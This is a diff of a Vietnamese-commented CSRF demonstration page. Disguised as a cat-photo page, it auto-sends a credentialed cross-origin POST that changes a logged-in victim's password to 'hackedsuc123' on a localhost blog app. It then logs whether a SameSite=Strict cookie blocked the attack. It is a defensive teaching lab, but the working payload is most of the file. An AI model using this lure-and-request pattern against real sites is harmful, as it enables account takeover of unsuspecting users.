@@ -1,29 +1,157 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Demo – Mèo siêu dễ thương 🐱</title>
+    <style>
+        body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 2rem; }
+        h1   { color: #e94560; }
+        #log { background: #16213e; border: 1px solid #0f3460; padding: 1rem;
+               border-radius: 6px; margin-top: 1.5rem; min-height: 120px; }
+        .ok  { color: #4ecca3; }
+        .err { color: #e94560; }
+        .inf { color: #f5a623; }
+    </style>
+</head>
 <body>
 
-<h1>Xem ảnh mèo siêu dễ thương</h1>
+<h1>🐱 Xem ảnh mèo siêu dễ thương</h1>
 
-<img
-    src="https://picsum.photos/400/300"
->
+<!--
+    ══════════════════════════════════════════════════════════════════
+    CSRF DEMO PAGE  –  Malicious Origin: http://localhost:4000
+    ══════════════════════════════════════════════════════════════════
+
+    SCENARIO
+    --------
+    Victim đã đăng nhập vào ứng dụng blog (http://localhost:5000).
+    Browser giữ cookie:  auth_token=<JWT>  (HttpOnly, SameSite=Strict)
+
+    Kẻ tấn công dụ victim mở trang này (http://localhost:4000/index.html).
+    Trang ngay lập tức gửi fetch() đến /api/change-password.
+
+    WHY THE ATTACK FAILS ON fixed_app.py
+    -------------------------------------
+    SameSite=Strict  →  browser KHÔNG đính kèm cookie vào cross-site request.
+    Request đến server KHÔNG có auth_token cookie.
+    verify_token() trả về None  →  endpoint trả 401 Unauthorized.
+    Mật khẩu KHÔNG bị thay đổi.
+
+    WHY IT WOULD SUCCEED (nếu không có SameSite=Strict)
+    ----------------------------------------------------
+    Nếu cookie KHÔNG có SameSite=Strict, browser gửi kèm cookie.
+    verify_token() đọc cookie, giải mã JWT thành công.
+    Mật khẩu của victim bị đổi thành 'hackedsuc123' mà không hay biết.
+
+    NOTE: localhost:4000 nằm trong FRONTEND_ORIGINS của fixed_app.py,
+    nên CORS preflight PASS — nhưng CORS không bảo vệ cookie cross-site.
+    Chỉ SameSite=Strict mới ngăn được attack này.
+    ══════════════════════════════════════════════════════════════════
+-->
+
+<img src="https://picsum.photos/400/300" alt="cute cat">
+
+<div id="log">
+    <span class="inf">⏳ Đang khởi động CSRF attack demo...</span>
+</div>
 
 <script>
-        window.onload = async () => {
-            // Sử dụng fetch để ép trình duyệt gửi kèm Cookie (credentials: 'include')
-            try {
-                const response = await fetch('http://localhost:5001/api/change-password', {
-                    method: 'POST',
-                    headers: {
-                        // Lưu ý: Không dùng Custom Header ở đây vì sẽ bị CORS chặn trước khi kịp gửi cookie
-                        'Content-Type': 'application/json' 
-                    },
-                    body: JSON.stringify({ password: 'hackedsuc123' }),
-                    credentials: 'include' // BẮT BUỘC: Cho phép gửi kèm cookie cross-origin
-                });
-                console.log("Attack triggered!");
-            } catch (err) {
-                console.error("Lỗi gửi request:", err);
+    // ── Cấu hình ────────────────────────────────────────────────────────────
+    //   Backend Flask app chạy tại localhost:5000 (fixed_app.py)
+    //   Trang CSRF này phục vụ tại http://localhost:4000
+    const BACKEND = 'https://localhost:5001';
+    const TARGET  = `${BACKEND}/api/change-password`;
+
+    const log = document.getElementById('log');
+
+    function addLog(msg, cls = 'inf') {
+        const line = document.createElement('div');
+        line.className = cls;
+        line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        log.appendChild(line);
+    }
+
+    window.onload = async () => {
+        log.innerHTML = ''; // clear placeholder
+
+        addLog('📤 Sending cross-origin POST to ' + TARGET);
+        addLog('   Origin: http://localhost:4000  →  https://localhost:5001');
+        addLog('   credentials: "include"  (browser sẽ gửi kèm cookie nếu có)');
+
+        let status, body;
+
+        try {
+            // ── CSRF ATTACK REQUEST ─────────────────────────────────────────
+            //
+            //  Content-Type: application/json  →  triggers CORS preflight.
+            //  credentials: 'include'          →  browser gửi kèm cookie.
+            //
+            //  Nếu server có SameSite=Strict trên cookie auth_token,
+            //  browser KHÔNG đính kèm cookie → server nhận request không có
+            //  token → 401.
+            //
+            //  Nếu không có SameSite, cookie được gửi kèm → attack thành công.
+            // ──────────────────────────────────────────────────────────────
+            const response = await fetch(TARGET, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                    // KHÔNG dùng custom header như Authorization vì sẽ bị
+                    // CORS preflight chặn nếu server không whitelist header đó.
+                    // Attack này chỉ dựa vào cookie được trình duyệt tự gửi kèm.
+                },
+                body: JSON.stringify({ password: 'hackedsuc123' }),
+                credentials: 'include'  // BẮT BUỘC: gửi kèm cookie cross-origin
+            });
+
+            status = response.status;
+            body   = await response.json().catch(() => ({}));
+
+            // ── Đánh giá kết quả ────────────────────────────────────────────
+            if (status === 200) {
+                // Cookie không có SameSite=Strict → attack THÀNH CÔNG (lỗ hổng)
+                addLog('', '');
+                addLog('🔴 ATTACK SUCCEEDED — HTTP 200', 'err');
+                addLog('   Mật khẩu đã bị đổi thành "hackedsuc123"!', 'err');
+                addLog('   Cookie THIẾU SameSite=Strict → cookie được gửi kèm.', 'err');
+                addLog('   ⚠ Đây là lỗ hổng CSRF nghiêm trọng (CWE-352).', 'err');
+            } else if (status === 401) {
+                // SameSite=Strict ngăn cookie → server không nhận được token
+                addLog('', '');
+                addLog('🟢 ATTACK BLOCKED — HTTP 401 Unauthorized', 'ok');
+                addLog('   Browser không gửi cookie do SameSite=Strict.', 'ok');
+                addLog('   verify_token() nhận request không có auth_token.', 'ok');
+                addLog('   Mật khẩu KHÔNG bị thay đổi. ✓', 'ok');
+                addLog('   Body: ' + JSON.stringify(body), 'ok');
+            } else if (status === 404) {
+                // Endpoint không tồn tại (đang test app.py thay vì fixed_app.py)
+                addLog('⚠ HTTP 404 — /api/change-password không tồn tại.', 'err');
+                addLog('  Hãy chạy fixed_app.py (không phải app.py).', 'err');
+            } else {
+                addLog(`ℹ HTTP ${status} — ${JSON.stringify(body)}`, 'inf');
             }
-        };
-    </script>
+
+        } catch (networkErr) {
+            // Network error: backend chưa chạy hoặc CORS preflight thất bại
+            addLog('', '');
+            addLog('⚠ Network error / CORS preflight failed:', 'err');
+            addLog('   ' + networkErr.message, 'err');
+            addLog('', '');
+            addLog('Kiểm tra:', 'inf');
+            addLog('  1. fixed_app.py đang chạy tại localhost:5001?', 'inf');
+            addLog('  2. Trang này serve tại http://localhost:4000 (không phải file://)?', 'inf');
+            addLog('     → cd thư_mục_chứa_index.html && python -m http.server 4000', 'inf');
+        }
+
+        // ── Tóm tắt cơ chế bảo vệ ──────────────────────────────────────────
+        addLog('', '');
+        addLog('── Cơ chế phòng thủ trong fixed_app.py ──', 'inf');
+        addLog('  set_cookie("auth_token", token, httponly=True, samesite="Strict")', 'inf');
+        addLog('  SameSite=Strict: browser KHÔNG gửi cookie trong cross-site request.', 'inf');
+        addLog('  verify_token(): đọc Authorization header TRƯỚC, sau mới đọc cookie.', 'inf');
+        addLog('  → CSRF qua cookie không thể bypass JWT requirement này.', 'inf');
+    };
+</script>
 
 </body>
+</html>
